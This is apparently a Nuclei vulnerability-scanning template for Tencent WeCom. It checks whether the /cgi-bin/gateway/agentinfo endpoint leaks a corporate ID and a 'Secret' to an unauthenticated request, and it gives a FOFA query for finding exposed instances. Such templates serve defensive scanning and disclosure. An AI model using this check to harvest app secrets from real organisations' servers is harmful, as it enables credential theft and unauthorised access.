id: tencent-wechat-agentinfo-disclosure

info:
  name: 腾讯企业微信 agentinfo - disclosure
  author: leadlife
  severity: high
  description: todo
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="Tencent-企业微信"
  tags: disclosure,wechat,tencent

http:
  - raw:
      - |
        GET /cgi-bin/gateway/agentinfo HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'strcorpid','Secret')
        condition: and